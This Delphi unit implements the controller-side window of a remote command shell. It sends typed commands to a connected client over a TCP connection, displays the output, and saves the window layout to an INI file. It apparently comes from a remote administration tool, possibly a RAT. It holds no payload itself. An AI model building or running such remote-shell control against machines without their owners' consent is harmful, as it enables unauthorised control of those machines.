unit UnitShell;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ComCtrls, UnitConnection, IniFiles, IdTCPServer, sEdit;

type
  TFormShell = class(TForm)
    redt1: TRichEdit;
    edt1: TsEdit;
    procedure edt1KeyPress(Sender: TObject; var Key: Char);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCreate(Sender: TObject);
    procedure FormShow(Sender: TObject);
  protected
    procedure CreateParams(var Params: TCreateParams) ; override;
  private
    { Private declarations }
    Client: PConnectionDatas;
  public
    { Public declarations }
    constructor Create(aOwner: TComponent; ConnDatas: PConnectionDatas);
    procedure OnRead(AThread: TIdPeerThread; ReceivedDatas: string);
  end;

var
  FormShell: TFormShell;

implementation

uses
  UnitConstants;

{$R *.dfm}
       
constructor TFormShell.Create(aOwner: TComponent; ConnDatas: PConnectionDatas);
begin
  inherited Create(aOwner);
  Client := ConnDatas;
end;

procedure TFormShell.CreateParams(var Params: TCreateParams) ;
begin
  inherited;
  Params.ExStyle := Params.ExStyle or WS_EX_APPWINDOW;
  Params.WndParent := 0;
end;

procedure TFormShell.OnRead(AThread: TIdPeerThread; ReceivedDatas: string);
var
  MainCommand: string;
begin
  MainCommand := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
  Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

  if MainCommand = SHELLSTART then
  begin
    redt1.Color := clBlack;
    edt1.Color := clBlack;
  end
  else

  if MainCommand = SHELLSTOP then
  begin
    redt1.Clear;
    redt1.Color := clWhite;
    edt1.Color := clWhite;
  end
  else

  if MainCommand = SHELLDATAS then
  begin
    redt1.Text := redt1.Text + ReceivedDatas;
    redt1.SelStart := Length(redt1.Text);
    SendMessage(redt1.handle, EM_SCROLLCARET, 0, 0);
  end;;
end;

procedure TFormShell.edt1KeyPress(Sender: TObject; var Key: Char);
begin
  if edt1.Color <> clBlack then Exit;
  if Key = Char(VK_RETURN) then
  begin
    if edt1.Text = '' then Exit;
    SendDatas(Client.AThread, SHELLCOMMAND + '|' + edt1.Text);
    if LowerCase(edt1.Text) = 'exit' then Close;
    edt1.Text := '';
    edt1.SetFocus;
  end;
end;

procedure TFormShell.FormClose(Sender: TObject; var Action: TCloseAction);
var
  TmpStr: string;
  IniFile: TIniFile;
begin
  if redt1.Color <> clWhite then SendDatas(Client.AThread, SHELLSTOP + '|');

  TmpStr := ExtractFilePath(ParamStr(0)) + 'Settings.ini';
  IniFile := TIniFile.Create(TmpStr);
  IniFile.WriteInteger('Shell', 'Left', Left);
  IniFile.WriteInteger('Shell', 'Top', Top);
  IniFile.WriteInteger('Shell', 'Width', Width);
  IniFile.WriteInteger('Shell', 'Height', Height);
  IniFile.Free;
end;

procedure TFormShell.FormCreate(Sender: TObject);
var
  TmpStr: string;
  IniFile: TIniFile;
begin
  TmpStr := ExtractFilePath(ParamStr(0)) + 'Settings.ini';
  IniFile := TIniFile.Create(TmpStr);
  Left := IniFile.ReadInteger('Shell', 'Left', 299);
  Top := IniFile.ReadInteger('Shell', 'Top', 122);
  Width := IniFile.ReadInteger('Shell', 'Width', 619);
  Height := IniFile.ReadInteger('Shell', 'Height', 345);
  IniFile.Free;
end;

procedure TFormShell.FormShow(Sender: TObject);
begin
  edt1.SetFocus;
end;

end.
